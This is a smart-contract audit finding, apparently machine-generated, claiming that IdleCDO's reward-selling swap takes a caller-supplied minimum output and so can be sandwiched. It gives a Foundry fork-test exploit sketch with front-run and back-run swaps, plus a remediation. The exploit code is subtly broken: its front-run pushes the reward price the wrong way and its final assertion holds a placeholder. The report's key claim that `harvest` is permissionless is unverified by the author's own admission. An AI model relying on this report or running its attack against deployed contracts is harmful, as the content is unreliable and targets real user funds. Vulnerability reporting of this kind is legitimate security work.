### Title
`IdleCDO.harvest()` sells rewards via `_sellReward()` with caller-controlled `amountOutMinimum`, exposing reward swaps to sandwich attacks - (File: contracts/IdleCDO.sol)

### Summary
`IdleCDO._sellReward()` performs a Uniswap V3 `exactInput` swap where `amountOutMinimum` is taken verbatim from the caller-supplied `_minAmount` parameter [1](#0-0) . The external `harvest()` entry point that funnels into `_sellReward` is permissionless (it is designed to be called by keepers/anyone) and accepts the min-amount array from the caller. An unprivileged attacker can therefore pass `_minAmount = 0` (or call `harvest` right after manipulating the pool), exactly mirroring the `VoltBurn.buyNSendToVoltTreasury()` zero-slippage sandwich: the swap executes at a manipulated price and the attacker back-runs it to extract the difference. The proceeds are forwarded to the strategy, so the loss is borne by all tranche holders through a lower NAV / `getContractValue`.

### Finding Description
In `contracts/IdleCDO.sol:607-630`, `_sellReward` builds `ISwapRouter.ExactInputParams` with `amountOutMinimum: _minAmount` and `deadline: block.timestamp + 100`, then calls `exactInput` [2](#0-1) . `_minAmount` is an argument supplied by the harvest caller; there is no on-chain floor, oracle check, or owner-set minimum slippage anywhere in the swap path. Because `harvest` has no access control, the attacker does not even need to frontrun an honest keeper — they can:

1. Swap a large amount of `_token`→`_rewardToken` on the Uni V3 pool, pushing the reward token price down.
2. Call `harvest(...)` with `_minAmount[i] = 0`, causing the CDO to sell its full reward balance (`_amount == 0` falls back to `_contractTokenBalance(_rewardToken)`) at the manipulated rate.
3. Swap back, profiting the difference extracted from the CDO's reward proceeds.

The same pattern exists verbatim in every chain variant that overrides `_sellReward`: `IdleCDOArbitrum` [3](#0-2) , `IdleCDOAvax` [4](#0-3) , `IdleCDOBase` [5](#0-4) , `IdleCDOOptimism` [6](#0-5) , `IdleCDOPolygon` and `IdleCDOPolygonZK`.

### Impact Explanation
Direct theft of value: reward tokens accrued by the strategy are sold at a manipulated price, and the MEV extractor pockets the spread. The loss is socialized across all AA/BB tranche holders via reduced NAV. The magnitude is bounded by the reward balance at harvest time times achievable pool manipulation, and is repeatable every harvest while rewards accrue — matching the "user can extract tokens from the swap due to zero slippage" impact of the external report.

### Likelihood Explanation
- `harvest` is permissionless by design (keeper pattern), so no privileged role is needed; any EOA satisfies the unprivileged-attacker constraint.
- `_minAmount = 0` is an accepted input; there is no revert on zero `amountOutMinimum`.
- No existing guard helps: `_skimDonatedAssets`, epoch gating, KYC/Keyring checks and `_onlyIdleCDO` are all unrelated to the harvest swap path.
- Preconditions: the CDO must hold a sellable reward-token balance and the Uni V3 pool on the harvest path must be manipulable (normal liquidity conditions on L2/sidechain deployments — Arbitrum, Base, Polygon, zkEVM, Optimism — are typically thin enough for this to be profitable).

### Recommendation
Do not let the harvest caller set `amountOutMinimum` freely. Either:
- enforce a protocol-set minimum slippage (e.g., owner-configurable `minSlippageBps`, applied against a quoted/reference price), or
- compute `amountOutMinimum` on-chain from a TWAP oracle (Uni V3 `observe`) rather than the caller-supplied `_minAmount`, and
- revert if `_minAmount` is below the oracle-derived floor when keeper-supplied hints are kept for gas efficiency.

### Proof of Concept
Foundry fork test sketch against mainnet (or Arbitrum for `IdleCDOArbitrum`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed as IERC20} from "../contracts/interfaces/IERC20Detailed.sol";
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

interface IIdleCDO {
    function harvest(
        bool _skipRewardCheck,
        bool[] calldata _skipReward,
        uint256[] calldata _minAmount,
        bytes[] calldata _extraData
    ) external;
    function getContractValue() external view returns (uint256);
}

contract HarvestSandwichTest is Test {
    IIdleCDO cdo = IIdleCDO(/* deployed IdleCDO address */);
    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address reward = /* reward token the CDO holds, e.g. COMP/CRV */;
    address token  = /* underlying, e.g. DAI */;

    function testSandwichHarvest() public {
        // ensure the CDO has accumulated a reward balance (warp/deal as needed on the fork)

        uint256 navPre = cdo.getContractValue();
        uint256 attackerPre = IERC20(reward).balanceOf(address(this));

        // 1) frontrun: dump `token` -> pool, crash reward price
        deal(token, address(this), 10_000_000e18);
        IERC20(token).approve(address(router), type(uint256).max);
        router.exactInputSingle(ISwapRouter.ExactInputSingleParams({
            tokenIn: token, tokenOut: reward, fee: 3000,
            recipient: address(this), deadline: block.timestamp,
            amountIn: 10_000_000e18, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // 2) call harvest with zero slippage as an unprivileged caller
        bool[] memory skip = new bool[](1);
        uint256[] memory mins = new uint256[](1); // mins[0] == 0
        bytes[] memory extra = new bytes[](1);    // abi-encoded UniV3 path
        cdo.harvest(false, skip, mins, extra);

        // 3) backrun: swap reward -> token, restoring price and pocketing the spread
        uint256 rewardBal = IERC20(reward).balanceOf(address(this));
        IERC20(reward).approve(address(router), rewardBal);
        router.exactInputSingle(ISwapRouter.ExactInputSingleParams({
            tokenIn: reward, tokenOut: token, fee: 3000,
            recipient: address(this), deadline: block.timestamp,
            amountIn: rewardBal, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // attacker profited, CDO NAV is lower than an unmanipulated harvest would give
        assertGt(IERC20(token).balanceOf(address(this)), 10_000_000e18, "no profit extracted");
        assertLt(cdo.getContractValue(), navPre + /* expectedFairRewardProceeds */ 0, "NAV not hurt");
    }
}
```

Caveat on verification: I confirmed `_sellReward`'s zero-enforced `amountOutMinimum` and its presence across all chain variants, but the index did not return the body of `harvest()` itself, so the exact parameter encoding of `_minAmount`/`_extraData` should be double-checked against the deployed ABI (it is `harvest(bool,bool[],uint256[],bytes[])` per `IIdleCDO`/`abi/IdleCDO.json`). The vulnerability logic — caller-supplied `minAmount = 0` on a permissionless reward-sell — is confirmed in `_sellReward`.

```text
  function _sellReward(address _rewardToken, bytes memory _path, uint256 _amount, uint256 _minAmount)
    internal virtual
    returns (uint256, uint256) {
    // If 0 is passed as sell amount, we get the whole contract balance
    if (_amount == 0) {
      _amount = _contractTokenBalance(_rewardToken);
    }
    if (_amount == 0) {
      return (0, 0);
    }
  
    // Uni v3 swap
    ISwapRouter _swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20Detailed(_rewardToken).safeIncreaseAllowance(address(_swapRouter), _amount);
    // multi hop swap params
    ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({
      path: _path,
      recipient: address(this),
      deadline: block.timestamp + 100,
      amountIn: _amount,
      amountOutMinimum: _minAmount
    });
    // do the swap and return the amount swapped and the amount received
    return (_amount, _swapRouter.exactInput(params));
```
